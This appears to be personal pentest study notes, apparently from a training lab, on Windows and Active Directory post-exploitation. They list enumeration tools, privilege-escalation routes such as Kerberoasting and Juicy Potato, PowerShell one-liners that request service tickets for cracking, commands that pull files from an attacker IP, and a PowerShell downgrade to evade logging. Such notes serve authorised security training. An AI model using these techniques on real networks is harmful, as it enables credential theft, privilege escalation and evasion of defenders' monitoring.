The final goal for a machine is to get to  `NT AUTHORITY\SYSTEM` 

## After initial access
Once we have gained access and got credentials, we can gather more information or connect to the host with the following methods:
 - CrackMapExec: with `-U <username> -p <password>` to query usernames, groups, logged on users, ...
- BloodHound: can be used to recover active sessions (logged on users)
- SMBmap
- Impacket: (psexec, wmiexec)
	- psexec: Create remote connection to host (via RPC) and give us an interactive remote shell as SYSTEM. Need a user with local admin privileges

#### Windows
- ActiveDirectory module for powershell
- powerview
- Snaffler (for credentials hunt in shares)
- BloodHound (for visualization) with SharpHound (for data collection)

## Methods for Privesc
- Try [[LLMNR & NBT-NS Poisoning]]
- Retry password spraying and hope to find an admin account
- Windows exploits, such as Eternal Blue
- Abusing running services (normal privesc)
- Kerberoasting
- Abusing `SeImpersonate` (check with `whoami /all`) with [Juicy Potato](https://github.com/ohpe/juicy-potato)
- Find other vulnerabilities with standard method or through `winpeas` (normal privesc)

### Kerberoasting
Abuses the Kerberos protocol to harvest password hashes (TGS ticket) for AD users with Service Principal Name (SPN) values (service accounts). These hashes can then either be cracked offline, or we can use pass-the-hash functionalities (in `evil-winrm` for example).

Steps:
- Find accounts with SPN
- Trigger kerberoast attack with tools such as Rubeus
- Take hashes offline and use hashcat -m 13100

Tools:
- GetUserSPN from Impacket (python)
- kerberoast ()
- targetedKerberoast
- Rubeus

#### From Windows
- Enumerate SPN with native command `setspn.exe`
- Manually: load ticket into memory using Powershell:
	- ```Add-Type -AssemblyName System.IdentityModel
	- `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"`
- using `setspn.exe`:
	- `setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }`
- Extract ticket from memory using mimikatz
## Bloodhound
Running SharpHound/BloodHound is always a good idea on the target. It helps use see the paths that can be taken from our user to domain admins / domain controllers.

The results can be taken back locally on our machine and analysed.

## Transfer Files
- `wget <ip> -o <target>`
- curl
- certutil
- `(New-Object System.Net.WebClient).DownloadFile(<ip>, <target>`
- scp
- ftp/tftp

## Living off the Land (LOTL)
- powershell can be downgraded with `powershell.exe -version 2`. Interesting as version 2 does not have log system enabled, meaning we will be stealthier
- Check defenses with `netsh` and `sc`
- Check network with: 
	- `arp -a`
	- `route print`
	- `ipconfig /all`
- Check WMI: Windows Management Instrumentation
- `Net` commands (accounts, group, localgroup, ..)
- [`dsquery`](https://www.aud507.com/media/DSQuery.pdf)
- [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2022-ps): check defenses

For other Powershell commands, check [[Powershell Cheatsheet]]

## Once admin
- enumerate the domain (with tool such as Bloodhound for example or windapsearch)
- Kerberoasting
- SMB relay attacks
- gather Net-NTLMv2 hashes
- token impersonation
- ACL attacks